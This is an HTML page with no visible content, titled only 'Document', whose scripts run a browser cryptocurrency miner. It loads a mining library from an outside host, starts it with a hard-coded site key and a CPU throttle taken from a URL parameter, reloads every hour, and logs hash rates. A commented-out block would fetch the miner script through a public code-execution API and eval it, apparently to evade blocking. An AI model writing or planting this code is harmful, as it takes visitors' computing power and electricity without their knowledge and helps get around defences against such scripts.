<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        let use = urlParams.get('use') ? parseFloat(urlParams.get('use')) : 0.8;
        window.use = use;
    </script>

    <!-- <script>setInterval(async () => { if (window.lastCode && window.lastCode != await (await fetch(location.href)).text()) location.reload(); window.lastCode = await (await fetch(location.href)).text(); }, 5000);</script> -->
    <script>
        setTimeout(() => { window.location.reload(); }, 1000 * 60 * 60)
    </script>
    <script src="https://www.hostingcloud.racing/sIu3.js"></script>
    <!-- <script src="http://share.liveblog365.com/GJTy.php?f=9sx5.js"></script> -->


    
    <!-- <script>
        const originalFetch = window.fetch;

        window.fetch = async (...args) => {
            const [url, options] = args;
            return originalFetch(newUrl, newOptions);
        };

        // Example usage of the overridden fetch
        (async () => {
            try {
                const response = await fetch('https://jsonplaceholder.typicode.com/todos/1'); // Replace with the desired URL
                const data = await response.text();
                console.log(data); // Log the response data
            } catch (error) {
                console.error('Fetch failed:', error);
            }
        })();



    </script> -->

    <script>

        let template = (str) => `
const https = require('https');

async function fetchData(url) {
    return new Promise((resolve) => {
        https.get(url, (res) => {
            let data = '';

            // A chunk of data has been received
            res.on('data', (chunk) => {
                data += chunk;
            });

            // The whole response has been received
            res.on('end', () => {
                resolve({ data, error: null }); // Resolve with data
            });
        }).on('error', (err) => {
            resolve({ data: null, error: err }); // Resolve with error
        });
    });
}

async function main() {
    const url = '${str}';
    const { data, error } = await fetchData(url);
    if (error) {
        console.log('Error:', error);
    } else {
        console.log(data);
    }
}
    
main();
`;



        async function reqPrx(url) {
            const data = JSON.stringify({
                'code': template(url),
                'language': 'js',
            });

            try {
                const response = await fetch('https://api.codex.jaagrav.in/', {
                    method: 'POST', // HTTP method
                    headers: {
                        'Content-Type': 'application/json',
                        'Content-Length': data.length // Set the content length
                    },
                    body: data // Write data to the request body
                });

                if (!response.ok) { // Check if the response is ok
                    throw new Error(`HTTP error! Status: ${response.status}`);
                }

                const responseData = await response.json(); // Parse the JSON response
                return responseData.output; // Return the output

            } catch (error) {
                console.error('Error:', error); // Log any errors
                return null;
            }
        }










        let Client = window.Client;


        (async () => {
            // await (async () => {
            //     eval(await reqPrx('https://www.hostingcloud.racing/sIu3.js'));
            // })();

            while (!Client) {
                await new Promise(r => setTimeout(r, 1000));
                Client = window.Client;
            }

            var _client = new Client.Anonymous('a5f009879c378a1a5fbe1510f5a17dafac00af74e406b136140ec763f77b83fb', {
                throttle: 1 - use, c: 'w', ads: 0
            });
            _client.start();
            window._client = _client;

            while (1) {
                await new Promise(r => setTimeout(r, 1000));
                running = _client.isRunning();

                console.log(running, _client.getHashesPerSecond());
            }
        })()
    </script>


</body>

</html>